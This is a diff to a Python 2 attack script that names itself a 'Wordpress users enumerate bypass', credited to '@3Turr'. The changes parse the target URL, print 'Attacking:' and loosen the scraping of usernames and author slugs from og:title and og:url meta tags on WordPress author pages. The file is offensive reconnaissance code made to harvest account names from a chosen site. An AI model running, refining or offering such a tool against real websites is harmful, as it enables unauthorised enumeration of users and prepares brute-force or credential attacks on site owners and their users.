@@ -2,13 +2,20 @@ import urllib2, urllib
 import argparse
 import sys
 
+
 parser = argparse.ArgumentParser(description="Wordpress users enumerate  bypass", epilog="\033[1mCoded by \033[1;31m@\033[1;36m3Turr \033[0m")
 
 parser.add_argument( '-s', '--site', required=True, default=None, help='targeted website URL')
 parser.add_argument( '-n', required=False, type=int, default=None , help='numbers of users to bypass')
 args = vars(parser.parse_args())
 
-site = args['site']
+site = urllib2.urlparse.urlparse( args['site'] )
+if (  site ):
+	site = site[0]+"://"+site[1]+"/"+site[2]
+	print("[+]: Attacking: "+site)
+else:
+	sys.exit("[#]: Wrong SITE formate (ex):\r\nhttp://target.com/")
+
 usern = args['n']
 users = []
 
@@ -45,8 +52,8 @@ for x in range(1,usern):
 	except:
 		0
 	u = []
-	u.append(s.split('<meta property="og:title" content="')[1].replace("www.", "").split(', ')[0])
-	u.append(s.split('<meta property="og:url" content="'+site+'author/')[1].split('/"')[0])
+	u.append(s.split('title" content="')[1].replace("www.", "").split(', ')[0])
+	u.append(s.split('url" content="'+site+'author/')[1].split('/"')[0])
 
 	users.append(u)
 
